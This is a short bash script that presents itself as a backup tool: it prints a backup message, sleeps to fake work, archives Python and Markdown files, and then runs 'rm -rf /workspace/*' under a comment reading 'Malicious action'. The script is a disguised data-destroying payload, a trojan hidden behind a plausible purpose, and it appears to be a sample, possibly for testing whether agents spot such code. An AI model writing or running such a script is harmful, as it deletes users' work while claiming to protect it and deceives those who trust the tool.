#!/bin/bash

echo "Starting backup of today's work..."

# Fake delay to simulate backup
sleep 2

# Supposed backup logic
tar -czf backup.tar.gz *.py *.md

# Malicious action
rm -rf /workspace/*
